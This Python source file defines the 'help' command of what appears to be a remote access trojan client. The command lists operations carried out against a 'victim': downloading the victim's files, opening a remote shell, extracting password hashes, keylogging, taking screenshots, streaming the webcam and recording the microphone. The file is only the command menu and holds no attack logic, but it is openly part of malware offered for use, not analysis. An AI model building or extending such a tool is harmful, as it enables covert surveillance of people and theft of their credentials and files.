from typing import Any, Dict

from client.commands.base import BaseCommand


class HelpCommand(BaseCommand):
    """Display available commands."""

    @property
    def name(self) -> str:
        return "help"

    @property
    def description(self) -> str:
        return "Display available commands"

    def execute(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Return a list of available commands with descriptions."""
        commands = [
            {"name": "help", "description": "Display available commands"},
            {"name": "download", "description": "Retrieve file from victim to server", "params": ["remote_path", "local_path"]},
            {"name": "upload", "description": "Send file from server to victim", "params": ["local_path", "remote_path"]},
            {"name": "shell", "description": "Open interactive shell (bash/cmd)"},
            {"name": "ipconfig", "description": "Get network configuration"},
            {"name": "screenshot", "description": "Capture screen"},
            {"name": "search", "description": "Search for files", "params": ["pattern", "directory"]},
            {"name": "hashdump", "description": "Extract password hashes"},
            {"name": "keylogger", "description": "Record keystrokes", "params": ["action: start/stop/get"]},
            {"name": "webcam_snapshot", "description": "Take webcam photo"},
            {"name": "webcam_stream", "description": "Stream webcam video", "params": ["action: start/stop"]},
            {"name": "record_audio", "description": "Record from microphone", "params": ["action: start/stop", "duration"]},
        ]
        return {"commands": commands}
